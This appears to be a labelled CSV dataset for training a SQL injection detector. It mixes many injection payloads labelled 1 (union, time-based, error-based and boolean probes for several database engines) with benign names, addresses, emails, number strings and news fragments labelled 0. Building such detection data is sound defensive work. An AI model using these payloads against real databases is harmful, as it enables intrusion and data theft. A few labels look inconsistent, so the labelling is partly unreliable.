Sentence,Label
"-8940"" )  or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( ""vnuo"" like ""vnuo",1
"perez pujol, 112, 3g",0
13710,0
ha6agar,0
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and   (  (   ( 'aatp' = 'aatp",1
69082096d,0
4296025977282656,0
"-7579%"" or 6570 = 1764",1
 He took oath court &apos;s 18 black-robed judges Nile-side seat built resemble ancient Egyptian temple ,0
eusquero,0
5154425798181531,0
620,0
1' )  as oknw where 8777 = 8777,1
r393lin3nte,0
" Two YMCA employees charged sex offences allegations Jonathan Lord , Royal Commission hears Two YMCA NSW employees charged child sex offences allegations raised Caringbah child care worker Jonathan Lord 2011 , child sexual abuse Royal Commission heard ",0
"1%"" union all select null--",1
"-8203  )  )   as eqlf where 6132 = 6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132,6132--",1
"1 where 7522 = 7522 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",1
" Do think youth force, cannot speak me",0
56443206x,0
" A study dogs responded real dogs could help , explained ",0
c/ emile robin 194 9?h,0
boget brufau,0
"1 )  and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( 8450 = 8450",1
"select count ( * )  from generate_series ( 1,5000000 ) -- gqkk",1
"1"" )  where 1807 = 1807",1
"1, ( select  ( case when  ( 7616 = 7616 )  then 1 else 1/ ( select 0 )  end  )  )  ",1
kinsey@etnics.fm,0
"1'+ ( select llcl where 8188 = 8188 and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
60781516z,0
homero,0
"1'  )  )   as kxek where 3429 = 3429 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
"calle ladera, 147 10-e",0
4963506739861376,0
"-3913"" where 6085 = 6085 union all select 6085,6085,6085,6085,6085,6085,6085#",1
pintarrajar,0
monturi,0
"-3997'+ ( select 'avjk' where 1917 = 1917 union all select 1917,1917,1917--",1
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (  ""pawh"" = ""pawh",1
"1'  )  )   and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (  'tqpj' = 'tqpj",1
"1"" )  where 5850 = 5850 or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
31819774x,0
05480,0
ardie9temente,0
graciot ballv,0
-2050' union all select 5606#,1
rio eo 144,0
"-7868' in boolean mode )  union all select 5117,5117,5117,5117,5117,5117,5117,5117,5117#",1
encad7622i6,0
978,0
1%'  )  )   )  and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (   ( '%' = ',1
eugen-fargue@andrestabernero.im,0
daciano,0
puntallana,0
"1' )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and  ( 'uwbh' = 'uwbh",1
1 )  as mtnw where 7293 = 7293 and 2603 = 5764--,1
sqlvuln,1
"1'+ ( select 'mgrj' where 8514 = 8514 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x  )  )  +'",1
"iif ( 2452 = 8999,1,1/0 ) ",1
7745667684469889,0
" According police , 63-year-old man suddenly stepped pub onto footpath , cyclist unable brake time ",0
1 where 7224 = 7224 and sleep ( 5 ) #,1
herrera,0
"1'  )  )   as hmyc where 6732 = 6732 and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  --",1
"1'  )  )   )  union all select null,null,null,null,null#",1
"c/ alfara de algimia, 184",0
quality,0
83657455s,0
ren,0
"1 where 1326 = 1326 union all select null,null,null,null,null,null--",1
"camio da mina, 175,",0
" Unfolding 1760s France , tells grim story Suzanne , young aristocrat sent convent family ",0
2178510189723400,0
18120,0
hogu1ra,0
 &quot; Studies show English schools devote less time maths - 116 hours year three hours week term time - countries ,0
-2307'  )  )   )  or 6872 = 6872 and   (  (   ( 'fyok' like 'fyok,1
himsel_ewande@spainbareback.ad,0
"-9240' union all select 6538,6538,6538#",1
shay-pin,0
lorletha,0
p4i6at122,0
"1%""  )  )   )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and   (  (   ( ""%"" = """,1
"-2314""  )  )   or make_set ( 9354 = 9354,7185 )  and   (  (  ""uatq"" like ""uatq",1
" Here find residence powerful man north Alps , Praetor CCAA ",0
"-3628"" or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) ",1
34878590x,0
nebila,0
cote suengas,0
32788800t,0
nype.shafer@canovash.bv,0
" Result: Marine Le Pen &apos;s right-wing , anti-EU National Front crucial by-election , knocking ruling Socialists third place ",0
" &quot; It interesting see whether new Pope nominate cardinals rest world restore balance , &quot; said ",0
abi,0
49160,0
scarlett,0
"1""  )  )   and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
67estada,0
"iif ( 5571 = 4947,1,1/0 ) ",1
08349,0
kri!sti,0
"1  )  )   as qzmg where 4344 = 4344 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 ) --",1
" For long periods , Janson performer stage ",0
estamariu,0
"1%'  )  )   and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
1'  )  )   as tcby where 5213 = 5213,1
" According Kaiser , many hikers refer area showpiece Schluchtensteig , landscape provides ideal framework fantastic views ",0
"iif ( 4460 = 1610,1,1/0 ) ",1
1 )  as vxsh where 4706 = 4706,1
jochen,0
4238960811185827,0
 The scientists behind project hope Elisa could achieve ,0
guillory,0
karattup,0
 The assailants also fired shots bus stop ,0
"admin"" or ""1"" = ""1""/*",1
mageto,0
1'  )  )   rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (  'ltki' = 'ltki,1
"iif ( 8354 = 3515,1,1/0 ) ",1
"1 where 6221 = 6221 and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
zip 201704/00001491531967789,0
1' )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( 'izyf' = 'izyf,1
"1 where 2914 = 2914 union all select null,null,null#",1
rosic@faders.com.sn,0
09230,0
"-7416"" where 7656 = 7656 order by 1--",1
x' and members.email is NULL; --,1
19492,0
0800405487098378,0
02624260y,0
24443,0
spurway,0
1317,0
1819477389412406,0
1'|| ( select 'gdzt' where 4950 = 4950,1
kinnie,0
"1' )  and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( 'rspz' = 'rspz",1
genesis,0
licinio,0
caizares,0
17889538t,0
3889877274730885,0
sykes,0
"-8838""  )  )   as xisn where 2749 = 2749 or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --",1
" select * from users where id = 1 or ""{1"" = 1 or 1 = 1 -- 1",1
puebla de don fadrique,0
88356550a,0
tienchie,0
claudino,0
50491,0
junette6,0
1565,0
besal,0
fluvia,0
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and   (  (   ( 'knbx' like 'knbx",1
" The Town Council consented sale recent meeting , part meeting open public ",0
"-2855""  )  )   )  union all select 1496,1496,1496,1496#",1
"simancas, 172, 8-d",0
35936056m,0
"1"" )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and  ( ""xhqc"" = ""xhqc",1
bar5i5a070,0
"1'|| ( select 'xjtq' from dual where 5719 = 5719 or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  )  ||'",1
22584,0
higueruela,0
2ontrapugnar,0
"1%""  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and ""%"" = """,1
72906034j,0
1 and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) # yoch,1
kirov@ofertachina.fm,0
roze,0
"1  )  )   as wufr where 5239 = 5239 or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
c/ florida 162 1-f,0
"c/ vallcorba 152, 7?f",0
1' in boolean mode ) ,1
boothroy,0
2545,0
"1'+ ( select bruk where 1400 = 1400 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1  )  )  +'",1
arguette@tuslimites.tc,0
 A preliminary investigation showed Yangcheng Evening News Group &apos;s New Express published several untrue reports listed company Zoomlion period September 2012 August 2013 ,0
2864,0
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( USERNAME  )  )   FROM SYS.ALL_USERS  )  )   AND 'i' = 'i,1
nettleton.hamissi@estudiodeyoga.pt,0
vadim@drae2.ci,0
"travesia olmos, s/n 12e",0
villadecanes,0
50259,0
whitman,0
"san benito, 182,",0
"bosquecillo, 137",0
"1"" )  as hoiv where 9708 = 9708 and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  --",1
"1"" )  or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and  ( ""gvlc"" like ""gvlc",1
"-4093'  )  )   union all select 5785,5785,5785#",1
" Rumours affair involving Clarke first picked NotW &apos;s features desk source sexually interested Ms Pawlby told: &quot; Don &apos;t bother wasting time , &apos;s Charles ",0
cogotillo,0
"1"" )  where 9770 = 9770 union all select null,null,null,null,null,null--",1
"-6431' or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and 'ixix' like 'ixix",1
debrocar,0
net.valdez@salaparis.gt,0
"1 and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  -- dkwz",1
3328,0
"1%"" )  and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and  ( ""%"" = """,1
22193,0
throne@familiamarino.cl,0
"1 or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  ",1
"1'  )  )   )  and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (   ( 'jicq' like 'jicq",1
"granados 151,",0
griffy,0
farlay,0
"1' where 2373 = 2373 union all select null,null#",1
"1' and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and 'ulep' = 'ulep",1
"1'  )  )   )  union all select null,null,null,null,null,null,null,null,null#",1
"1'|| ( select 'gwxc' from dual where 3626 = 3626 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
retasac5n,0
33744160d,0
adriaens,0
c/ pablo serrano 53 1?g,0
"macario, 87,",0
a9tr8pfag4,0
 They accompanied strict security precautions ,0
astor,0
"-9352""  )  )   )  or 3038 = 3038",1
"1 )  or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) ",1
" Nerves sides , particularly receiving ball , resulted errors lost points; even lack passing times critical moments overeagerness saw potential points wasted ",0
"1 where 6369 = 6369 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 ) --",1
lian,0
1'|| ( select 'xmoq' from dual where 8047 = 8047 and 7533 = 7533 ) ||',1
34830,0
7770,0
"1' )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and  ( 'iwkg' = 'iwkg",1
alcolea,0
rabulas,0
ynes,0
3099595340897586,0
epnimo,0
1' where 2958 = 2958,1
"calle tren 8, 8?h",0
"1'+ ( select 'tyuz' where 3957 = 3957 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null  )  )  +'",1
doblonada,0
"c/ barri del polvori, 77",0
10380,0
1'  )  )   )  rlike sleep ( 5 )  and   (  (   ( 'zwyx' = 'zwyx,1
8164,0
2214198462446690,0
4557,0
gabriele,0
aveinte,0
5718,0
ballb canudes,0
pike@multasdetransito.gf,0
33773632h,0
documet recasens,0
", 2006; Huang Zweig, 2002; Stolcke Shriberg, 1996)",0
lehrer@didacramirez.sb,0
balcells parets,0
trufa4dor,0
-9555'  )  )   )  or  ( 8459 = 8459 ) *4906 and   (  (   ( 'rwpq' like 'rwpq,1
" select * from users where id = 1 or 1#""; union select version (  ) ,version (  )  -- 1",1
8270545725750345,0
"1"" )  or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( ""zbwn"" like ""zbwn",1
"-9932"" union all select 4049,4049,4049--",1
1' )  union all select null#,1
antulio,0
"1'  )  )   or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and   (  (  'bmbt' = 'bmbt",1
4856355827488327,0
11ance3er,0
argeo,0
47 New York Stock Exchange Friday afternoon ,0
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ||'",1
v,1
carrer sant joan de deu 186,0
50535908d,0
abellot*ada,0
"1%'  )  )   )  and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (   ( '%' = '",1
trixie,0
96304534s,0
fabiano,0
"-3862  )  )   as vqtl where 9629 = 9629 union all select 9629,9629,9629,9629,9629--",1
"1%""  )  )   and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #",1
1'  )  )   or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (  'ytxg' = 'ytxg,1
haker-durango@mirallesmoscardo.ro,0
cor,0
kabibble3@ccalzamora.gd,0
46157420p,0
malva,0
37169,0
09831514a,0
"select * from generate_series ( 1488,1488,case when  ( 1488 = 1685 )  then 1 else 0 end )  limit 1--",1
inistola,0
"1'  )  )   )  and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and   (  (   ( 'vfnl' = 'vfnl",1
9.84is22nte334c799,0
swearing,0
"1'  )  )   )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (   ( 'yiem' = 'yiem",1
3539419158271932,0
15751165y,0
6481855129498664,0
"1'  )  )   and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (  'ykxz' = 'ykxz",1
"calle isla de la toja 84,",0
0731466925802277,0
reiko,0
1'  )  )   as grne where 9003 = 9003 order by 1--,1
amengual casanova,0
"-2027%"" )  union all select 2048,2048,2048,2048,2048,2048,2048,2048#",1
 Several high-profile suspects made televised confessions recently ,0
mcdonald,0
1%' and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and '%' = ',1
"plaza luis pombo, s/n 9?g",0
4108422495216222,0
vyza,0
"-6084'  )  )   or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  'dfcp' = 'dfcp",1
"1' )  and elt ( 1210 = 1210,sleep ( 5  )  )   and  ( 'medg' = 'medg",1
 The report also includes list typical symptoms communicated children allergic reaction ,0
"1'|| ( select 'fcnb' where 2869 = 2869 or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  )  ||'",1
 The viewer sees joints still carved hand ,0
nafria mirambell,0
"1'+ ( select ttae where 4601 = 4601 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5  )  )  +'",1
"-9379 )  or make_set ( 9354 = 9354,7185 )  and  ( 9212 = 9212",1
frambueso,0
"1'  )  )   as owcw where 1107 = 1107 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
7694435206249147,0
 She compared several German sayings corresponding Bible verses explained meaning ,0
" Mr Ströbele said , according former NSA contractor &apos;s lawyer , Mr Snowden would able return Russia left ",0
1  )  )   )  rlike sleep ( 5 ) #,1
algemes,0
 She move muscle rescue - frozen solid ,0
amelie,0
gusta mont,0
"1"" )  as vzdq where 3160 = 3160",1
" But depressed knowing something wrong , demanded medical records ",0
60,0
" select * from users where id = 1 +\+. union select null,@@VERSION -- 1",1
gomero gallardo,0
"1  )  )   as oywa where 7951 = 7951 union all select null,null,null,null,null,null#",1
 The Pfullendorf municipal energy company forms last link chain ,0
"-7255' union all select 2127,2127,2127,2127,2127#",1
5ecom058a?8a,0
-5062 )  where 7457 = 7457 or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --,1
